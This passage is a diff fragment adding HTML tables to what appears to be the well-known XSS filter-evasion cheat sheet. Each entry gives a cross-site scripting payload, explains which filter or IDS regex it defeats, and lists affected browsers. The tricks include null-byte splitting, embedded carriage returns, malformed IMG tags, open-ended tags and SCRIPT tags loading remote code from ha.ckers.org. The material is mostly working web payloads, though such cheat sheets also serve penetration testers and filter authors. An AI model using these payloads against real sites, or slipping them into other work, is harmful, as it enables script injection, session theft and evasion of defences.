+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Embedded Character Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Embedded carriage return to break up XSS (Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters).</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant Multiline w/Carriage Returns</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link73" type="button" value="[+] Expand" onClick="toggle_visibility('table73','link73');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table73" name="table73">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Embedded Character Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IMG
+SRC
+=
+"
+j
+a
+v
+a
+s
+c
+r
+i
+p
+t
+:
+a
+l
+e
+r
+t
+(
+'
+X
+S
+S
+'
+)
+"
+&gt;
+</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Multiline Injected JavaScript using ASCII carriage returns (same as above only a more extreme example of this XSS vector).</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Null Chars 1</td>
+	<td width="10%"><div align="right"><input id="link74" type="button" value="[+] Expand" onClick="toggle_visibility('table74','link74');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table74" name="table74">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Embedded Character Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">perl -e 'print "&lt;IMG SRC=java\0script:alert("XSS")&gt;";'&gt; out</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Okay, I lied, null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy (http://www.portswigger.net/proxy/) or use %00 in the URL string or if you want to write your own injection tool you can use Vim (^V^@ will produce a null) to generate it into a text file.  Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hyphen control char). But the null char %00 is much more useful and helped me bypass certain real world filters with a variation on this example.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant Null Chars 2</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link75" type="button" value="[+] Expand" onClick="toggle_visibility('table75','link75');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table75" name="table75">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Embedded Character Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">perl -e 'print "&amp;&lt;SCR\0IPT&gt;alert("XSS")&lt;/SCR\0IPT&gt;";' &gt; out</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Here is a little known XSS attack vector using null characters.  You can actually break up the HTML itself using the same nulls as shown above. I've seen this vector bypass some of the most restrictive XSS filters to date</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Spaces/Meta Chars</td>
+	<td width="10%"><div align="right"><input id="link76" type="button" value="[+] Expand" onClick="toggle_visibility('table76','link76');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table76" name="table76">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Embedded Character Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Spaces and meta chars before the JavaScript in images for XSS (this is useful if the pattern match doesn't take into account spaces in the word "javascript:" - which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the "javascript:" keyword. The actual reality is you can have any char from 1-32 in decimal).</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant Non-Alpha/Non-Digit</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link77" type="button" value="[+] Expand" onClick="toggle_visibility('table77','link77');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table77" name="table77">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Embedded Character Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Non-alpha-non-digit XSS.  While I was reading the Firefox HTML parser I found that it assumes a non-alpha-non-digit is not valid after an HTML keyword and therefore considers it to be a whitespace or non-valid token after an HTML tag.  The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace.  For example "&lt;SCRIPT\s" != "&lt;SCRIPT/XSS\s"</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Non-Alpha/Non-Digit Part 2</td>
+	<td width="10%"><div align="right"><input id="link78" type="button" value="[+] Expand" onClick="toggle_visibility('table78','link78');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table78" name="table78">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Embedded Character Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Non-alpha-non-digit XSS part 2.  yawnmoth brought my attention to this vector, based on the same idea as above, however, I expanded on it, using my fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc...) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this does not apply to the grave accent char as seen here.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="ns"&gt;IE6.0&lt;/span&gt;|&lt;span class="ns"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant No Closing Script Tag</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link79" type="button" value="[+] Expand" onClick="toggle_visibility('table79','link79');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table79" name="table79">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Embedded Character Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;SCRIPT SRC=http://ha.ckers.org/xss.js</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don't actually need the "&gt;&lt;/SCRIPT&gt;" portion of this Cross Site Scripting vector. Firefox assumes it's safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn't affect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they're not needed generally.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="ns"&gt;IE6.0&lt;/span&gt;|&lt;span class="ns"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Protocol resolution in script tags</td>
+	<td width="10%"><div align="right"><input id="link80" type="button" value="[+] Expand" onClick="toggle_visibility('table80','link80');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table80" name="table80">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Embedded Character Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">This particular variant was submitted by Lukasz Pilorz and was based partially off of Ozh's protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a &lt;/SCRIPT&gt; tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The ".j" is valid, regardless of the MIME type because the browser knows it in context of a SCRIPT tag.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="ns"&gt;IE6.0&lt;/span&gt;|&lt;span class="ns"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant Half-Open HTML/JavaScript</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link81" type="button" value="[+] Expand" onClick="toggle_visibility('table81','link81');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table81" name="table81">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Embedded Character Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IMG SRC="javascript:alert('XSS')"</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Unlike Firefox, the IE rendering engine doesn't add extra data to your page, but it does allow the "javascript:" directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes that there is at least one HTML tag below where you are injecting this cross site scripting vector. Even though there is no close &gt; tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. See http://www.blackhat.com/presentations/bh-usa-04/bh-us-04-mookhey/bh-us-04-mookhey-up.ppt for more info. It gets around the following NIDS regex:
+	/((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/ 
+As a side note, this was also effective against a real world XSS filter I came across using an open ended &lt;IFRAME tag instead of an &lt;IMG tag.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Double open angle brackets</td>
+	<td width="10%"><div align="right"><input id="link82" type="button" value="[+] Expand" onClick="toggle_visibility('table82','link82');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table82" name="table82">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Embedded Character Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">This is an odd one that Steven Christey brought to my attention. At first I misclassified this as the same XSS vector as above but it's surprisingly different. Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won't</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="ns"&gt;IE6.0&lt;/span&gt;|&lt;span class="ns"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant Extraneous Open Brackets</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link83" type="button" value="[+] Expand" onClick="toggle_visibility('table83','link83');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table83" name="table83">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Embedded Character Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/SCRIPT&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">(Submitted by Franz Sedlmaier http://www.pilorz.net/).  This XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore (http://www.cs.utexas.edu/users/moore/best-ideas/string-searching/) that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course).  The double slash comments out the ending extraneous bracket to supress a JavaScript error.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Malformed IMG Tags</td>
+	<td width="10%"><div align="right"><input id="link84" type="button" value="[+] Expand" onClick="toggle_visibility('table84','link84');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table84" name="table84">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Embedded Character Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Originally found by Begeek (http://www.begeek.it/2006/03/18/esclusivo-vulnerabilita-xss-in-firefox/#more-300 - cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes.  I assume this was originally meant to correct sloppy coding.  This would make it significantly more difficult to correctly parse apart an HTML tag.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant No Quotes/Semicolons</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link85" type="button" value="[+] Expand" onClick="toggle_visibility('table85','link85');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table85" name="table85">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Embedded Character Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;SCRIPT&gt;a=/XSS/
+alert(a.source)&lt;/SCRIPT&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">No single quotes or double quotes or semicolons.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Evade Regex Filter 1</td>
+	<td width="10%"><div align="right"><input id="link86" type="button" value="[+] Expand" onClick="toggle_visibility('table86','link86');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table86" name="table86">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">XSS w/HTML Quote Encapsulation</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;SCRIPT a="&gt;" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">For performing XSS on sites that allow "&lt;SCRIPT&gt;" but don't allow "&lt;SCRIPT SRC..." by way of the following regex filter:
+	/&lt;script[^&gt;]+src/i</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant Evade Regex Filter 2</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link87" type="button" value="[+] Expand" onClick="toggle_visibility('table87','link87');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table87" name="table87">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">XSS w/HTML Quote Encapsulation</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;SCRIPT ="blah" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">For performing XSS on sites that allow "&lt;SCRIPT&gt;" but don't allow "&lt;SCRIPT SRC..." by way of a regex filter:
+	/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'"&gt;\s]+))?)+\s*|\s*)src/i
+	
+(this is an important one, because I've seen this regex in the wild)</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Evade Regex Filter 3</td>
+	<td width="10%"><div align="right"><input id="link88" type="button" value="[+] Expand" onClick="toggle_visibility('table88','link88');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table88" name="table88">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">XSS w/HTML Quote Encapsulation</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;SCRIPT a="blah" '' SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Another XSS to evade this regex filter:
+	/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'"&gt;\s]+))?)+\s*|\s*)src/i</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant Evade Regex Filter 4</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link89" type="button" value="[+] Expand" onClick="toggle_visibility('table89','link89');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table89" name="table89">
+	<tr>
